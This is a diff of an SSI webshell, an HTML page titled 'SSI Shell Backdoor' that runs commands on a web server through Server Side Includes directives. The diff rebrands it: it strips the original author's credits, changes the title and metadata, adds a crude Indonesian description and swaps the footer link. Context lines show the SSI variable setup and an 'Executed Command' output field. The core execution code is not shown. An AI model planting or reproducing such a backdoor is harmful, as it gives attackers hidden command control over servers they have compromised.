@@ -1,10 +1,4 @@
 <!-- Author : Unknown45 -->
-<!-- hargai author dengan cara menggunakan script ini tanpa recode script nya !!! -->
-
-<!-- 
-Recoded? only changed and delete copyright? Don't be a bastard dude!
- ~ Kata Bang zerobyte.id
-  -->
 
 <!--#config errmsg="Error / Webnya Ga Support SSI Command"-->
 <!--#set var="zero" value="" -->
@@ -15,11 +9,11 @@ Recoded? only changed and delete copyright? Don't be a bastard dude!
 <!--#endif -->
 <html>
 <head>
-<title>SSI Webshell</title>
+<title>SSI Shell Backdoor</title>
 <meta name="theme-color" content="#000">
-<meta name="Author" content="Unknown45">
-<meta name="description" content="Security ? that just an illusion - ">
-<meta property="og:description" content="Security ? that just an illusion - ">
+<meta name="Author" content="SSI-Shell">
+<meta name="description" content="Ngentod Yuk!! - ">
+<meta property="og:description" content="Ngentod Yuk!! - ">
 </head>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
@@ -304,6 +298,6 @@ Executed Command : </font><b><font face="courier" id="cmd"><!--#echo var=shl -->
 </font>
 <hr>
 <center>
-	<font face="courier" size=2>Unknown45 - 2021<br><a href="https://exploits.site" target="_blank">https://exploits.site</a></font></center>
+	<font face="courier" size=2>Mr. Quixter - 2021<br><a href="mr-quixter.blogspot.com" target="_blank">https://mr-quixter.blogspot.com</a></font></center>
 </body>
 </html>
